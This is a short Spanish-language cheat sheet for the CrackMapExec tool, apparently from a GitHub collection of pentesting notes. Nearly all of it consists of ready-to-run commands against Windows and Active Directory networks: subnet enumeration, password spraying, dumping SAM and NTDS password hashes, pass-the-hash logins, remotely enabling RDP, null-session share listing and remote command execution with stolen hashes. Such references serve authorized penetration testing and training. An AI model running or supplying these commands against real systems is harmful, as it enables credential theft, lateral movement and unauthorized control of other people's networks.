# CrackMapExec Cheat Sheet

#### Listar equipos dentro de la red de un AD
```
crackmapexec smb 192.168.1.0/24
```

#### Password Spraying
```
crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt
```

#### Conocer en que equipos se puede autenticar especificando un usuario y password
```
crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p '<PASSWORD>'
```

#### Dumping Hashes SAM
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --sam
```

#### Dumping Hashes NTLM
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --ntds
```

#### PassTheHash
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' --local-auth
```

#### Habilitar RDP con usuario y password de Administrador
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -M rdp -o action=enable
```

#### Enumeración de directorios compartidos SMB con NULL session
```
crackmapexec smb <IP-Address> -u 'null' -p ' ' --shares
```

#### Ejecutar comandos usando el Hash
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' -d <GROUP> -x 'COMMAND'
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' -d <GROUP> -X 'COMMAND'
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)